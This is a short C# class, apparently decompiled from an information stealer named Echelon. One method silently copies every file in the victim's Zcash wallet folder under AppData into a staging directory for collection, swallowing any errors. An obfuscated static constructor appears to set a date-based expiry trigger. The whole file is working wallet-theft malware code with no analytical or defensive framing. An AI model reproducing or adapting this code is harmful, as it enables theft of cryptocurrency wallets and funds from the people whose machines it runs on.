using Echelon;
using System;
using System.IO;

internal class bb
{
	public static string a;

	public static void a(string jw)
	{
		try
		{
			FileInfo[] files = new DirectoryInfo(Global.AppDate + "\\Zcash\\").GetFiles();
			foreach (FileInfo fileInfo in files)
			{
				Directory.CreateDirectory(jw + bb.a);
				fileInfo.CopyTo(jw + bb.a + fileInfo.Name);
			}
			ba.a++;
		}
		catch
		{
		}
	}

	static bb()
	{
		DateTime d = default(DateTime).AddYears(~(--278461204) ^ -278461688).AddMonths(~(-(~661771982 + 661771987))).AddDays(5.51728009259259);
		if ((DateTime.Now - d).TotalDays > 0.0)
		{
			int num = ~-500950095 + -500950094 << 1;
			num = (~(0x20D0EE0C ^ -695897167) ^ 0x9AA6243) / num;
		}
		bb.a = "\\Wallets\\Zcash\\";
	}
}
